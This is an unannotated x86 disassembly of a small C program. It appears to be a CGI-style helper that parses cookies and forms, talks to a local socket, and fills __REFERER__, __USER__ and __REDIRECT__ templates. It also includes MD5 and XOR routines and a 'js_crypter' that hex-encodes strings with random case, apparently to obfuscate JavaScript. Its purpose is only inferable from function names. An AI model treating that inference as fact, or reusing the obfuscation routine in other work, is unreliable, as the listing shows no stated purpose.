push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0xc
and esp, 0xfffffff0
mov ebx, dword [arg_4h]
mov edi, edx
lea esi, [ebp + ebx*4 + 0xc]
test ebx, ebx
mov dword [obj.environ], esi
jle 0x8048fdf
mov eax, dword [envp]
test eax, eax
je 0x8048fdf
mov dword [obj.__progname], eax
mov ecx, eax
mov al, byte [ecx]
test al, al
je 0x8048fdf
nop
cmp al, 0x2f
lea edx, [ecx + 1]
je 0x804901c
mov ecx, edx
mov al, byte [ecx]
test al, al
jne 0x8048fd0
mov eax, obj._DYNAMIC
test eax, eax
je 0x8049026
sub esp, 0xc
push edi
call sym.imp.atexit
add esp, 0x10
sub esp, 0xc
push sym._fini
call sym.imp.atexit
call sym._init
push eax
push esi
lea eax, [envp]
push eax
push ebx
call dbg.main
add esp, 0x14
push eax
call sym.imp.exit
nop
mov ecx, edx
mov dword [obj.__progname], edx
jmp 0x8048fd9
call sym.imp._init_tls
jmp 0x8048ff4
sub esp, 0xc
call sym.frame_dummy
call sym.__do_global_ctors_aux
add esp, 0xc
ret
push ebp
mov eax, 0
mov ebp, esp
sub esp, 8
test eax, eax
je 0x80490a0
sub esp, 8
push obj.object.2
push obj.__EH_FRAME_BEGIN__
call loc.imp.__deregister_frame_info
add esp, 0x10
mov eax, dword [obj.__JCR_LIST__]
test eax, eax
je 0x80490c4
mov eax, 0
test eax, eax
je 0x80490c4
sub esp, 0xc
push obj.__JCR_LIST__
call loc.imp.__deregister_frame_info
add esp, 0x10
mov esi, esi
leave
ret
push ebp
mov ebp, esp
push ebx
push edx
mov ebx, obj.__CTOR_LIST__
mov eax, dword [obj.__CTOR_LIST__]
jmp 0x804deab
lea esi, [esi]
sub ebx, 4
call eax
mov eax, dword [ebx]
cmp eax, 0xffffffff
jne 0x804dea4
pop eax
pop ebx
leave
ret
sub esp, 0xc
call sym.__do_global_dtors_aux
add esp, 0xc
ret
push ebp
mov ebp, esp
sub esp, 8
cmp byte [obj.completed.1], 0
je 0x804904e
jmp 0x8049079
lea esi, [esi]
add eax, 4
mov dword [obj.p.0], eax
call edx
mov eax, dword [obj.p.0]
mov edx, dword [eax]
test edx, edx
jne 0x8049044
mov eax, 0
test eax, eax
je 0x8049072
sub esp, 0xc
push obj.__EH_FRAME_BEGIN__
call loc.imp.__deregister_frame_info
add esp, 0x10
mov byte [obj.completed.1], 1
leave
ret
push ebp
mov ebp, esp
lea ecx, [buf]
sub esp, 0x88
mov edx, 0x80
mov byte [ecx], 0
inc ecx
dec edx
jne 0x804c62c
add eax, 0xffffff80
test eax, eax
jle 0x804c63f
call dbg.burn_stack
leave
ret
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x60
mov esi, dword [eax + 4]
mov edi, dword [eax + 8]
mov ebx, dword [eax]
mov dword [ctx], eax
mov eax, dword [eax + 0xc]
push 0x40
push edx
mov dword [D], eax
lea eax, [correct_words]
push eax
call sym.imp.memcpy
mov eax, dword [D]
xor eax, edi
and eax, esi
xor eax, dword [D]
add eax, dword [correct_words]
lea ebx, [eax + ebx - 0x28955b88]
rol ebx, 7
mov eax, esi
add ebx, esi
xor eax, edi
and eax, ebx
xor eax, edi
add eax, dword [var_54h]
mov edx, dword [D]
lea edx, [eax + edx - 0x173848aa]
rol edx, 0xc
mov eax, ebx
add edx, ebx
xor eax, esi
and eax, edx
xor eax, esi
add eax, dword [var_50h]
lea edi, [eax + edi + 0x242070db]
rol edi, 0x11
mov eax, edx
add edi, edx
xor eax, ebx
and eax, edi
xor eax, ebx
add eax, dword [var_4ch]
lea esi, [eax + esi - 0x3e423112]
rol esi, 0x16
mov eax, edx
add esi, edi
xor eax, edi
and eax, esi
xor eax, edx
add eax, dword [var_48h]
lea ebx, [eax + ebx - 0xa83f051]
rol ebx, 7
mov eax, esi
add ebx, esi
add esp, 0x10
xor eax, edi
and eax, ebx
xor eax, edi
add eax, dword [var_44h]
lea edx, [eax + edx + 0x4787c62a]
rol edx, 0xc
mov eax, ebx
add edx, ebx
xor eax, esi
and eax, edx
xor eax, esi
add eax, dword [var_40h]
lea edi, [eax + edi - 0x57cfb9ed]
rol edi, 0x11
mov eax, edx
add edi, edx
xor eax, ebx
and eax, edi
xor eax, ebx
add eax, dword [var_3ch]
lea esi, [eax + esi - 0x2b96aff]
rol esi, 0x16
mov eax, edx
add esi, edi
xor eax, edi
and eax, esi
xor eax, edx
add eax, dword [var_38h]
lea ebx, [eax + ebx + 0x698098d8]
rol ebx, 7
mov eax, esi
add ebx, esi
xor eax, edi
and eax, ebx
xor eax, edi
add eax, dword [var_34h]
lea edx, [eax + edx - 0x74bb0851]
rol edx, 0xc
mov eax, ebx
add edx, ebx
xor eax, esi
and eax, edx
xor eax, esi
add eax, dword [var_30h]
lea edi, [eax + edi - 0xa44f]
rol edi, 0x11
mov eax, edx
add edi, edx
xor eax, ebx
and eax, edi
xor eax, ebx
add eax, dword [var_2ch]
lea esi, [eax + esi - 0x76a32842]
rol esi, 0x16
mov eax, edx
add esi, edi
xor eax, edi
and eax, esi
mov ecx, dword [var_28h]
xor eax, edx
add eax, ecx
lea ebx, [eax + ebx + 0x6b901122]
rol ebx, 7
mov eax, esi
add ebx, esi
xor eax, edi
and eax, ebx
xor eax, edi
add eax, dword [var_24h]
lea edx, [eax + edx - 0x2678e6d]
rol edx, 0xc
mov eax, ebx
add edx, ebx
xor eax, esi
and eax, edx
xor eax, esi
add eax, dword [var_20h]
lea edi, [eax + edi - 0x5986bc72]
rol edi, 0x11
mov eax, edx
add edi, edx
xor eax, ebx
and eax, edi
xor eax, ebx
add eax, dword [var_1ch]
lea esi, [eax + esi + 0x49b40821]
rol esi, 0x16
add esi, edi
mov eax, esi
xor eax, edi
and eax, edx
xor eax, edi
add eax, dword [var_54h]
lea ebx, [eax + ebx - 0x9e1da9e]
rol ebx, 5
add ebx, esi
mov eax, ebx
xor eax, esi
and eax, edi
xor eax, esi
add eax, dword [var_40h]
lea edx, [eax + edx - 0x3fbf4cc0]
rol edx, 9
add edx, ebx
mov eax, edx
xor eax, ebx
and eax, esi
xor eax, ebx
add eax, dword [var_2ch]
lea edi, [eax + edi + 0x265e5a51]
rol edi, 0xe
add edi, edx
mov eax, edx
xor eax, edi
and eax, ebx
xor eax, edx
add eax, dword [correct_words]
lea esi, [eax + esi - 0x16493856]
rol esi, 0x14
add esi, edi
mov eax, esi
xor eax, edi
and eax, edx
xor eax, edi
add eax, dword [var_44h]
lea ebx, [eax + ebx - 0x29d0efa3]
rol ebx, 5
add ebx, esi
mov eax, ebx
xor eax, esi
and eax, edi
xor eax, esi
add eax, dword [var_30h]
lea edx, [eax + edx + 0x2441453]
rol edx, 9
add edx, ebx
mov eax, edx
xor eax, ebx
and eax, esi
xor eax, ebx
add eax, dword [var_1ch]
lea edi, [eax + edi - 0x275e197f]
rol edi, 0xe
add edi, edx
mov eax, edx
xor eax, edi
and eax, ebx
xor eax, edx
add eax, dword [var_48h]
lea esi, [eax + esi - 0x182c0438]
rol esi, 0x14
add esi, edi
mov eax, esi
xor eax, edi
and eax, edx
xor eax, edi
add eax, dword [var_34h]
lea ebx, [eax + ebx + 0x21e1cde6]
rol ebx, 5
add ebx, esi
mov eax, ebx
xor eax, esi
and eax, edi
xor eax, esi
add eax, dword [var_20h]
lea edx, [eax + edx - 0x3cc8f82a]
rol edx, 9
add edx, ebx
mov eax, edx
xor eax, ebx
and eax, esi
xor eax, ebx
add eax, dword [var_4ch]
lea edi, [eax + edi - 0xb2af279]
rol edi, 0xe
add edi, edx
mov eax, edx
xor eax, edi
and eax, ebx
xor eax, edx
add eax, dword [var_38h]
lea esi, [eax + esi + 0x455a14ed]
rol esi, 0x14
add esi, edi
mov eax, esi
xor eax, edi
and eax, edx
xor eax, edi
add eax, dword [var_24h]
lea ebx, [eax + ebx - 0x561c16fb]
rol ebx, 5
add ebx, esi
mov eax, ebx
xor eax, esi
and eax, edi
xor eax, esi
add eax, dword [var_50h]
lea edx, [eax + edx - 0x3105c08]
rol edx, 9
add edx, ebx
mov eax, edx
xor eax, ebx
and eax, esi
xor eax, ebx
add eax, dword [var_3ch]
lea edi, [eax + edi + 0x676f02d9]
rol edi, 0xe
add edi, edx
mov eax, edx
xor eax, edi
and eax, ebx
xor eax, edx
add eax, ecx
lea esi, [eax + esi - 0x72d5b376]
rol esi, 0x14
add esi, edi
mov eax, esi
xor eax, edi
xor eax, edx
add eax, dword [var_44h]
lea ebx, [eax + ebx - 0x5c6be]
rol ebx, 4
add ebx, esi
mov eax, ebx
xor eax, esi
xor eax, edi
add eax, dword [var_38h]
lea edx, [eax + edx - 0x788e097f]
rol edx, 0xb
add edx, ebx
mov eax, edx
xor eax, ebx
xor eax, esi
add eax, dword [var_2ch]
lea edi, [eax + edi + 0x6d9d6122]
rol edi, 0x10
add edi, edx
mov eax, edx
xor eax, edi
xor eax, ebx
add eax, dword [var_20h]
lea esi, [eax + esi - 0x21ac7f4]
rol esi, 0x17
add esi, edi
mov eax, esi
xor eax, edi
xor eax, edx
add eax, dword [var_54h]
lea ebx, [eax + ebx - 0x5b4115bc]
rol ebx, 4
add ebx, esi
mov eax, ebx
xor eax, esi
xor eax, edi
add eax, dword [var_48h]
lea edx, [eax + edx + 0x4bdecfa9]
rol edx, 0xb
add edx, ebx
mov eax, edx
xor eax, ebx
xor eax, esi
add eax, dword [var_3ch]
lea edi, [eax + edi - 0x944b4a0]
rol edi, 0x10
add edi, edx
mov eax, edx
xor eax, edi
xor eax, ebx
add eax, dword [var_30h]
lea esi, [eax + esi - 0x41404390]
rol esi, 0x17
add esi, edi
mov eax, esi
xor eax, edi
xor eax, edx
add eax, dword [var_24h]
lea ebx, [eax + ebx + 0x289b7ec6]
rol ebx, 4
add ebx, esi
mov eax, ebx
xor eax, esi
xor eax, edi
add eax, dword [correct_words]
lea edx, [eax + edx - 0x155ed806]
rol edx, 0xb
add edx, ebx
mov eax, edx
xor eax, ebx
xor eax, esi
add eax, dword [var_4ch]
lea edi, [eax + edi - 0x2b10cf7b]
rol edi, 0x10
add edi, edx
mov eax, edx
xor eax, edi
xor eax, ebx
add eax, dword [var_40h]
lea esi, [eax + esi + 0x4881d05]
rol esi, 0x17
add esi, edi
mov eax, esi
xor eax, edi
xor eax, edx
add eax, dword [var_34h]
lea ebx, [eax + ebx - 0x262b2fc7]
rol ebx, 4
add ebx, esi
mov eax, ebx
xor eax, esi
xor eax, edi
add eax, ecx
lea edx, [eax + edx - 0x1924661b]
rol edx, 0xb
add edx, ebx
mov eax, edx
xor eax, ebx
xor eax, esi
add eax, dword [var_1ch]
lea edi, [eax + edi + 0x1fa27cf8]
rol edi, 0x10
add edi, edx
mov eax, edx
xor eax, edi
xor eax, ebx
add eax, dword [var_50h]
lea esi, [eax + esi - 0x3b53a99b]
rol esi, 0x17
mov eax, edx
add esi, edi
not eax
or eax, esi
xor eax, edi
add eax, dword [correct_words]
lea ebx, [eax + ebx - 0xbd6ddbc]
rol ebx, 6
mov eax, edi
add ebx, esi
not eax
or eax, ebx
xor eax, esi
add eax, dword [var_3ch]
lea edx, [eax + edx + 0x432aff97]
rol edx, 0xa
mov eax, esi
add edx, ebx
not eax
or eax, edx
xor eax, ebx
add eax, dword [var_20h]
lea edi, [eax + edi - 0x546bdc59]
rol edi, 0xf
mov eax, ebx
add edi, edx
not eax
or eax, edi
xor eax, edx
add eax, dword [var_44h]
lea esi, [eax + esi - 0x36c5fc7]
rol esi, 0x15
mov eax, edx
add esi, edi
not eax
or eax, esi
xor eax, edi
add eax, ecx
lea ebx, [eax + ebx + 0x655b59c3]
rol ebx, 6
mov eax, edi
add ebx, esi
not eax
or eax, ebx
xor eax, esi
add eax, dword [var_4ch]
lea edx, [eax + edx - 0x70f3336e]
rol edx, 0xa
mov eax, esi
add edx, ebx
not eax
or eax, edx
xor eax, ebx
add eax, dword [var_30h]
lea edi, [eax + edi - 0x100b83]
rol edi, 0xf
mov eax, ebx
add edi, edx
not eax
or eax, edi
xor eax, edx
add eax, dword [var_54h]
lea esi, [eax + esi - 0x7a7ba22f]
rol esi, 0x15
mov eax, edx
add esi, edi
not eax
or eax, esi
xor eax, edi
add eax, dword [var_38h]
lea ebx, [eax + ebx + 0x6fa87e4f]
rol ebx, 6
mov eax, edi
add ebx, esi
not eax
or eax, ebx
xor eax, esi
add eax, dword [var_1ch]
lea edx, [eax + edx - 0x1d31920]
rol edx, 0xa
mov eax, esi
add edx, ebx
not eax
or eax, edx
xor eax, ebx
add eax, dword [var_40h]
lea edi, [eax + edi - 0x5cfebcec]
rol edi, 0xf
mov eax, ebx
add edi, edx
not eax
or eax, edi
xor eax, edx
add eax, dword [var_24h]
lea esi, [eax + esi + 0x4e0811a1]
rol esi, 0x15
mov eax, edx
add esi, edi
not eax
or eax, esi
xor eax, edi
add eax, dword [var_48h]
lea ebx, [eax + ebx - 0x8ac817e]
rol ebx, 6
mov eax, edi
add ebx, esi
not eax
or eax, ebx
xor eax, esi
add eax, dword [var_2ch]
lea edx, [eax + edx - 0x42c50dcb]
rol edx, 0xa
mov eax, esi
mov dword [D], edx
not eax
add edx, ebx
or eax, edx
xor eax, ebx
add eax, dword [var_50h]
lea edi, [eax + edi + 0x2ad7d2bb]
rol edi, 0xf
mov eax, ebx
add edi, edx
not eax
or eax, edi
xor eax, edx
add eax, dword [var_34h]
lea esi, [eax + esi - 0x14792c6f]
rol esi, 0x15
mov eax, dword [ctx]
add esi, edi
add dword [eax], ebx
add dword [eax + 4], esi
add dword [eax + 8], edi
add dword [eax + 0xc], edx
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret
jmp dword [reloc.memcpy]
push ebp
mov ebp, esp
push ebx
sub esp, 0x10
mov ebx, dword [size]
push ebx
call sym.imp.malloc
add esp, 0x10
test eax, eax
je 0x804d894
mov ebx, dword [var_4h]
leave
ret
sub esp, 8
push ebx
push str.error:_out_of_memory_in_function_xmalloc__d__
call sym.imp.printf
mov dword [esp], 0
call sym.imp.exit
mov esi, esi
jmp dword [reloc.malloc]
jmp dword [reloc.printf]
jmp dword [reloc.exit]
jmp dword [reloc.memset]
jmp dword [reloc.rand]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x1c
mov eax, dword [obj.last_errstr]
mov esi, dword [arg_8h]
test eax, eax
mov dword [obj.last_errno], esi
jne 0x804a8b4
lea eax, [esi - 1]
cmp eax, 0x24
ja 0x804a8a9
mov eax, dword [arg_ch]
test eax, eax
mov dword [pattern], eax
je 0x804a892
cmp byte [eax], 0
jne 0x804a8cc
sub esp, 0xc
push dword [esi*4 + obj.errors]
call sym.imp.strdup
mov dword [obj.last_errstr], eax
add esp, 0x10
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret
lea esi, [esi]
sub esp, 0xc
push eax
call sym.imp.free
add esp, 0x10
mov dword [obj.last_errstr], 0
jmp 0x804a87b
cld
mov edi, eax
mov ecx, 0xffffffff
xor eax, eax
repne scasb al, byte es:[edi]
mov edx, dword [esi*4 + obj.errors]
not ecx
mov edi, edx
mov dword [var_20h], ecx
mov ecx, 0xffffffff
repne scasb al, byte es:[edi]
not ecx
mov eax, dword [var_20h]
lea ecx, [ecx + eax - 2]
sub esp, 0xc
push ecx
call dbg.xmalloc
add esp, 0xc
push dword [pattern]
push dword [esi*4 + obj.errors]
mov ebx, eax
push eax
call sym.imp.sprintf
mov edi, ebx
cld
xor eax, eax
mov ecx, 0xffffffff
repne scasb al, byte es:[edi]
not ecx
add ecx, 0x27ff
mov dword [esp], ecx
call dbg.xmalloc
add esp, 0xc
lea edx, [arg]
push edx
push ebx
push eax
mov dword [obj.last_errstr], eax
call sym.imp.vsprintf
mov dword [esp], ebx
call sym.imp.free
add esp, 0x10
jmp 0x804a8a9
push ebp
mov ebp, esp
push ebx
sub esp, 0x78
push 0
push 1
push 1
call sym.imp.socket
mov dword [obj.fd], eax
add esp, 0x10
inc eax
je 0x804a100
push ecx
push 0x6a
push 0
lea ebx, [ebp - 0x78]
push ebx
call sym.imp.memset
mov byte [var_77h], 1
pop eax
pop edx
push obj.default_sock
lea eax, [addr.sun_len]
push eax
call sym.imp.strcpy
add esp, 0xc
push 0x6a
push ebx
push dword [obj.fd]
call sym.imp.connect
add esp, 0x10
inc eax
mov edx, 1
je 0x804a114
mov eax, edx
mov ebx, dword [var_4h]
leave
ret
mov esi, esi
sub esp, 0xc
push 1
call dbg.seterror
xor edx, edx
mov eax, edx
mov ebx, dword [var_4h]
leave
ret
nop
sub esp, 0xc
push dword [obj.fd]
call sym.imp.close
mov dword [esp], 2
jmp 0x804a105
jmp dword [reloc.socket]
jmp dword [reloc.strcpy]
jmp dword [reloc.connect]
jmp dword [reloc.close]
push ebp
mov ebp, esp
push ebx
mov ebx, dword [arg_14h]
cmp byte [ebx], 0
je 0x804d548
mov eax, dword [data]
mov ebx, dword [var_4h]
leave
ret
push dword [key]
push dword [len]
push dword [data]
call dbg.xorencode
mov byte [ebx], 1
mov eax, dword [data]
add esp, 0xc
mov ebx, dword [var_4h]
leave
ret
push ebp
mov ebp, esp
push edi
push esi
push ebx
mov ebx, dword [arg_8h]
test ebx, ebx
mov esi, dword [arg_ch]
mov edi, dword [arg_10h]
je 0x804d52c
test esi, esi
je 0x804d52c
xor edx, edx
jmp 0x804d51c
nop
mov ecx, edx
and ecx, 3
shl ecx, 3
mov eax, edi
shr eax, cl
xor byte [ebx + edx], al
inc edx
cmp edx, esi
jb 0x804d50c
pop ebx
pop esi
mov eax, 1
pop edi
leave
ret
mov esi, esi
pop ebx
pop esi
xor eax, eax
pop edi
leave
ret
push ebp
mov ebp, esp
push ebx
sub esp, 0x10
mov ebx, dword [arg_8h]
push ebx
call sym.imp.__inet_addr
add esp, 0x10
cmp eax, 0xffffffff
je 0x804c0b4
mov ebx, dword [var_4h]
leave
ret
lea esi, [esi]
sub esp, 0xc
push ebx
call sym.imp.gethostbyname
mov edx, eax
add esp, 0x10
xor eax, eax
test edx, edx
je 0x804c0ac
mov eax, dword [edx + 0x10]
mov eax, dword [eax]
mov eax, dword [eax]
mov ebx, dword [var_4h]
leave
ret
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0xc
mov eax, dword [var_8h]
mov edx, dword [arg_10h]
xor esi, esi
test eax, eax
mov dword [n], edx
mov dl, byte [var_ch]
je 0x804dbaa
mov ebx, eax
movsx edi, dl
jmp 0x804db71
mov esi, esi
cmp esi, dword [n]
je 0x804db96
inc esi
lea ebx, [eax + 1]
sub esp, 8
push edi
push ebx
call sym.imp.strchr
add esp, 0x10
test eax, eax
jne 0x804db68
cmp dword [n], esi
jne 0x804dbaa
mov dword [var_8h], ebx
lea esp, [var_ch_2]
pop ebx
pop esi
pop edi
leave
jmp sym.imp.strdup
sub eax, ebx
mov dword [var_ch], eax
mov dword [var_8h], ebx
lea esp, [var_ch_2]
pop ebx
pop esi
pop edi
leave
jmp dbg.xstrndup
lea esp, [var_ch_2]
pop ebx
pop esi
xor eax, eax
pop edi
leave
ret
push ebp
mov ebp, esp
mov eax, dword [arg_8h]
mov dword [eax], 0x67452301
mov dword [eax + 4], 0xefcdab89
mov dword [eax + 8], 0x98badcfe
mov dword [eax + 0xc], 0x10325476
mov dword [eax + 0x10], 0
mov dword [eax + 0x54], 0
leave
ret
push ebp
mov ebp, esp
mov eax, dword [arg_8h]
mov dl, byte [c]
xor edx, eax
movzx edx, dl
shr eax, 8
xor eax, dword [edx*4 + obj.Crc32Tab]
leave
ret
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0xc
mov ecx, dword [s1]
test ecx, ecx
mov esi, dword [arg_ch]
mov dword [l1], 0
je 0x804d421
mov edi, dword [s1]
cld
mov ecx, 0xffffffff
xor eax, eax
repne scasb al, byte es:[edi]
not ecx
dec ecx
mov dword [l1], ecx
xor ebx, ebx
test esi, esi
je 0x804d438
cld
mov ecx, 0xffffffff
xor eax, eax
mov edi, esi
repne scasb al, byte es:[edi]
not ecx
lea ebx, [ecx - 1]
mov edx, dword [l1]
sub esp, 0xc
lea eax, [edx + ebx + 1]
push eax
call sym.imp.malloc
mov edx, dword [l1]
add esp, 0x10
test edx, edx
mov edi, eax
jle 0x804d484
sub esp, 8
push dword [s1]
push eax
call sym.imp.strcpy
add esp, 0x10
test ebx, ebx
jle 0x804d47a
sub esp, 8
mov edx, dword [l1]
push esi
lea eax, [edi + edx]
push eax
call sym.imp.strcpy
add esp, 0x10
lea esp, [var_ch]
pop ebx
pop esi
mov eax, edi
pop edi
leave
ret
mov byte [eax], 0
jmp 0x804d463
push ebp
mov ebp, esp
push esi
mov esi, dword [arg_8h]
test esi, esi
push ebx
je 0x804abdf
mov eax, dword [esi + 4]
xor ebx, ebx
test eax, eax
je 0x804abc4
mov edx, dword [esi]
jmp 0x804ab76
lea esi, [esi]
mov eax, dword [edx + ebx*8 + 4]
test eax, eax
jne 0x804ab9c
inc ebx
cmp dword [esi + 4], ebx
jbe 0x804abb8
mov eax, dword [edx + ebx*8]
test eax, eax
je 0x804ab68
sub esp, 0xc
push eax
call sym.imp.free
mov edx, dword [esi]
mov eax, dword [edx + ebx*8 + 4]
add esp, 0x10
test eax, eax
mov dword [edx + ebx*8], 0
je 0x804ab70
mov esi, esi
sub esp, 0xc
push eax
call sym.imp.free
mov edx, dword [esi]
mov dword [edx + ebx*8 + 4], 0
inc ebx
add esp, 0x10
cmp dword [esi + 4], ebx
ja 0x804ab76
test ebx, ebx
je 0x804abc4
mov eax, dword [esi]
test eax, eax
jne 0x804abcb
mov esi, esi
lea esp, [var_8h]
pop ebx
pop esi
leave
ret
sub esp, 0xc
push eax
call sym.imp.free
add esp, 0x10
mov dword [esi], 0
jmp 0x804abc4
push eax
push 0
push str.form_free__p___p_
push 6
call dbg.seterror
jmp 0x804abc4
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x2c
cld
lea edi, [hexpad]
mov esi, 0x804ed34
mov ecx, 4
rep movsd dword es:[edi], dword ptr [esi]
movsb byte es:[edi], byte ptr [esi]
mov ecx, dword [str]
xor ebx, ebx
test ecx, ecx
mov eax, dword [arg_10h]
je 0x804af38
mov edx, dword [length]
test edx, edx
je 0x804af38
test eax, eax
mov esi, eax
je 0x804af6d
xor eax, eax
test esi, esi
je 0x804af50
xor edi, edi
cmp edi, dword [length]
jae 0x804af2c
mov edx, dword [str]
mov al, byte [edx + edi]
sar al, 4
and eax, 0xf
mov al, byte [ebp + eax - 0x38]
mov byte [esi + ebx], al
movsx eax, byte [edx + edi]
and eax, 0xf
mov al, byte [ebp + eax - 0x38]
mov byte [esi + ebx + 1], al
call sym.imp.random
test al, 1
jne 0x804af58
add ebx, 2
inc edi
cmp edi, dword [length]
jb 0x804aef8
lea esp, [var_ch]
pop ebx
mov eax, esi
pop esi
pop edi
leave
ret
mov esi, esi
sub esp, 0xc
push eax
push dword [length]
push dword [str]
push str.js_crypter_str_to_hex__p___d___p_
push 6
call dbg.seterror
xor eax, eax
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret
sub esp, 0xc
lea eax, [esi + ebx]
push eax
call dbg.upcase
add ebx, 2
add esp, 0x10
inc edi
jmp 0x804af27
sub esp, 8
push 3
push dword [length]
call dbg.xcalloc
mov esi, eax
add esp, 0x10
jmp 0x804aeeb
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0xc
mov eax, dword [pcookie]
test eax, eax
mov edx, dword [arg_ch]
je 0x804aad1
mov eax, dword [pcookie]
test edx, edx
mov dword [eax], 0
mov dword [eax + 4], 0
mov eax, 1
je 0x804aa85
mov ebx, edx
jmp 0x804aa05
cmp byte [ebx], 0
je 0x804aa80
sub esp, 8
push 0x3b
push ebx
call sym.imp.strchr
add esp, 0x10
test eax, eax
mov edi, eax
je 0x804aa1c
mov byte [eax], 0
push eax
push 0
push 0x3d
push ebx
call dbg.strsplit
add esp, 0x10
test eax, eax
mov esi, eax
je 0x804aa6b
push eax
push 1
push 0x3d
push ebx
call dbg.strsplit
add esp, 0x10
test eax, eax
mov dword [value], eax
je 0x804aa4a
cmp byte [eax], 0
jne 0x804aa90
sub esp, 0xc
push esi
call sym.imp.free
mov eax, dword [value]
add esp, 0x10
test eax, eax
je 0x804aa6b
sub esp, 0xc
push dword [value]
call sym.imp.free
add esp, 0x10
test edi, edi
lea ebx, [edi + 1]
je 0x804aa80
cmp byte [edi + 1], 0x20
jne 0x804aa00
lea ebx, [edi + 2]
cmp byte [ebx], 0
jne 0x804aa05
mov eax, 1
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret
lea esi, [esi]
mov edx, dword [pcookie]
mov eax, dword [edx + 4]
sub esp, 8
lea eax, [eax*8 + 8]
push eax
push dword [edx]
call sym.imp.realloc
mov ebx, eax
mov eax, dword [pcookie]
mov edx, dword [eax + 4]
mov dword [ebx + edx*8], esi
mov dword [eax], ebx
pop ecx
push dword [value]
mov dword [var_14h], edx
call dbg.urldecode
mov edx, dword [var_14h]
mov dword [ebx + edx*8 + 4], eax
mov eax, dword [pcookie]
inc dword [eax + 4]
pop edx
jmp 0x804aa60
push edx
push 0
push str.cookie_parse__p___p_
push 6
call dbg.seterror
xor eax, eax
jmp 0x804aa85
push ebp
mov ebp, esp
push esi
push ebx
sub esp, 8
push dword [referer]
push 0x804dfb3
call dbg.ntoa
add esp, 0xc
push eax
push str.__REFERER__
push dword [buf]
call dbg.strreplace
mov ebx, eax
pop eax
pop edx
push dword [username]
push 0x804dfb3
call dbg.ntoa
add esp, 0xc
push eax
push str.__USER__
push ebx
call dbg.strreplace
add esp, 0x10
test ebx, ebx
mov esi, eax
je 0x8049643
sub esp, 0xc
push ebx
call sym.imp.free
add esp, 0x10
push eax
mov eax, dword [redirect_url]
test eax, eax
je 0x8049678
push eax
push str.__REDIRECT__
push esi
call dbg.strreplace
add esp, 0x10
test esi, esi
mov ebx, eax
je 0x804966c
sub esp, 0xc
push esi
call sym.imp.free
add esp, 0x10
lea esp, [var_8h]
mov eax, ebx
pop ebx
pop esi
leave
ret
lea esi, [esi]
mov eax, 0x804e01f
jmp 0x804964b
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0xc
mov esi, dword [arg_8h]
test esi, esi
mov edi, dword [arg_ch]
je 0x804ab37
test edi, edi
je 0x804ab37
mov eax, dword [esi + 4]
xor ebx, ebx
test eax, eax
je 0x804ab1f
sub esp, 8
push edi
mov eax, dword [esi]
push dword [eax + ebx*8]
call dbg.stricmp
add esp, 0x10
test eax, eax
je 0x804ab29
inc ebx
cmp dword [esi + 4], ebx
ja 0x804ab04
lea esp, [var_ch]
pop ebx
pop esi
xor eax, eax
pop edi
leave
ret
mov eax, dword [esi]
mov eax, dword [eax + ebx*8 + 4]
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret
push edi
push esi
push str.form_get_value__p___p_
push 6
call dbg.seterror
jmp 0x804ab1f
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0xc
mov ebx, dword [str]
test ebx, ebx
je 0x804b1e3
mov ecx, dword [length]
test ecx, ecx
je 0x804b1bd
mov eax, dword [length]
sub esp, 0xc
inc eax
push eax
call dbg.xmalloc
mov dword [retval], eax
mov edx, dword [retval]
add esp, 0x10
xor eax, eax
test edx, edx
je 0x804b1a7
xor esi, esi
xor edi, edi
cmp esi, dword [length]
jae 0x804b19d
mov eax, dword [str]
mov bl, byte [eax + edi]
movsx edx, bl
cmp edx, 0xff
jbe 0x804b1d8
sub esp, 0xc
push edx
call sym.imp.___runetype
add esp, 0x10
and eax, 0x500
test eax, eax
jne 0x804b1b0
cmp bl, 0x5f
je 0x804b1b0
inc edi
cmp edi, dword [length]
jb 0x804b16c
mov eax, dword [retval]
mov byte [eax + esi], 0
mov eax, dword [retval]
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret
nop
mov eax, dword [retval]
mov byte [eax + esi], bl
inc edi
inc esi
cmp edi, dword [length]
jmp 0x804b19b
cld
mov ecx, 0xffffffff
xor eax, eax
mov edi, dword [str]
repne scasb al, byte es:[edi]
not ecx
dec ecx
mov dword [length], ecx
jmp 0x804b147
lea esi, [esi]
mov eax, dword [obj._CurrentRuneLocale]
mov eax, dword [eax + edx*4 + 0x34]
jmp 0x804b189
push dword [length]
push 0
push str.js_crypter_validate__p___d_
push 6
call dbg.seterror
xor eax, eax
jmp 0x804b1a7
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0xc
mov ebx, dword [arg_ch]
xor esi, esi
test ebx, ebx
mov edi, dword [arg_8h]
jne 0x804a15c
push 0
push edi
push str.client_send_data__p___d_
push 6
call dbg.seterror
xor eax, eax
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret
mov esi, esi
push 0
push ebx
push edi
push dword [obj.fd]
call sym.imp.send
add esp, 0x10
test eax, eax
jle 0x804a182
add esi, eax
sub ebx, eax
jne 0x804a15c
test eax, eax
jle 0x804a182
test ebx, ebx
mov eax, esi
je 0x804a152
sub esp, 0xc
push 3
jmp 0x804a14b
jmp dword [reloc.send]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x3c
mov ecx, dword [http_referer]
xor ebx, ebx
test ecx, ecx
je 0x80496a3
mov edi, dword [http_referer]
cld
mov ecx, 0xffffffff
xor eax, eax
repne scasb al, byte es:[edi]
mov ebx, ecx
not ebx
sub esp, 0xc
push 8
call dbg.xmalloc
mov dword [eax], 0
mov dword [eax + 4], 0
mov esi, eax
mov eax, dword [arg_8h]
mov dword [var_20h], eax
lea eax, [ebx + 0x20]
mov dword [var_1ch], eax
lea eax, [ebp - 0x38]
mov word [ebp - 0x38], 2
mov dword [esp], eax
call dbg.client_send_request
